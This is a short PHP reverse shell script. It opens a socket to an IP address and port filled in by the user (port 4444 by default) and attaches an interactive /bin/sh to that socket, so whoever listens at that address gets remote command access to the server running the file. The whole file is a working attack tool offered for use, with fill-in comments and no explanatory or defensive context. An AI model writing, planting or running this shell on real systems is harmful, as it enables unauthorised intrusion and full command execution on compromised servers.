<?php
$ip = '';  // 🛠️ TYour IP
$port = 4444;         // 🛠️  Your port

$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh -i", [
  0 => $sock,
  1 => $sock,
  2 => $sock
], $pipes);
?>
